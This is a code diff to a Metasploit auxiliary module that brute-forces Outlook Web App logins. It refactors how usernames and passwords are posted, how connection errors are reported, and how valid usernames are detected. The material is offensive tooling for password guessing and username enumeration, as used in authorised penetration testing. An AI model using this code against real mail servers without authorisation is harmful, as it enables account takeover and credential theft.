@@ -11,8 +11,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Auxiliary::Scanner
-
+  #include Msf::Auxiliary::Scanner
 
   def initialize
     super(
@@ -79,8 +78,6 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptInt.new('RPORT', [ true, "The target port", 443]),
-        OptAddress.new('RHOST', [ true, "The target address" ]),
         OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
         OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
       ], self.class)
@@ -91,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", ''])
       ], self.class)
 
-    deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
+    deregister_options('BLANK_PASSWORDS', 'PASSWORD', 'USERNAME')
   end
 
   def setup
@@ -106,8 +103,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    vhost = datastore['VHOST'] || datastore['RHOST']
-
     print_status("#{msg} Testing version #{action.name}")
 
     auth_path   = action.opts['AuthPath']
@@ -157,20 +152,29 @@ class MetasploitModule < Msf::Auxiliary
     headers = {
       'Cookie' => 'PBack=0'
     }
+    post_vars = {
+      'username' => user,
+      'password' => pass,
+    }
 
-    if datastore['SSL']
-      if action.name == "OWA_2013"
-        data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
-      else
-        data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
-      end
+    if action.name == "OWA_2013"
+      path = '/owa'
+      post_vars['flags'] = 4
+      post_vars['forcedownlevel'] = 0
+      post_vars['isUtf8'] = 1
     else
-      if action.name == "OWA_2013"
-        data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
-      else
-        data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
-      end
+      path = ''
+      post_vars['flags'] = 0
+      post_vars['trusted'] = 0
     end
+
+    destination = URI::Generic.build(
+      scheme: datastore['SSL'] ? "https" : "http",
+      host: vhost,
+      port: rport,
+      path: path
+    )
+    post_vars['destination'] = destination
 
     begin
       if datastore['AUTH_TIME']
@@ -182,7 +186,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri'      => auth_path,
         'method'   => 'POST',
         'headers'  => headers,
-        'data'     => data
+        'post_vars' => post_vars,
       })
 
       if datastore['AUTH_TIME']
@@ -193,7 +197,7 @@ class MetasploitModule < Msf::Auxiliary
       return :abort
     end
 
-    if not res
+    if res.nil?
       print_error("#{msg} HTTP Connection Error, Aborting")
       return
     end
@@ -264,31 +268,15 @@ class MetasploitModule < Msf::Auxiliary
       }, 20)
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("#{msg} HTTP Connection Failed, Aborting")
-      return :abort
+      return :connection_error
     end
 
-    if not res
+    if res.nil?
       print_error("#{msg} HTTP Connection Error, Aborting")
-      return :abort
+      return :connection_error
     end
 
-    if res.redirect?
-      if elapsed_time <= 1
-        report_cred(
-          ip: datastore['RHOST'],
-          port: datastore['RPORT'],
-          service_name: 'owa',
-          user: user
-        )
-        print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
-        return :Skip_pass
-      else
-        vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
-        return :skip_pass
-      end
-    end
-
-    if res.body =~ login_check
+    if !res.redirect? && res.body =~ login_check
       print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
       report_cred(
         ip: datastore['RHOST'],
@@ -307,10 +295,8 @@ class MetasploitModule < Msf::Auxiliary
           user: user
         )
         print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
-        return :Skip_pass
       else
         vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
-        return :skip_pass
       end
     end
   end
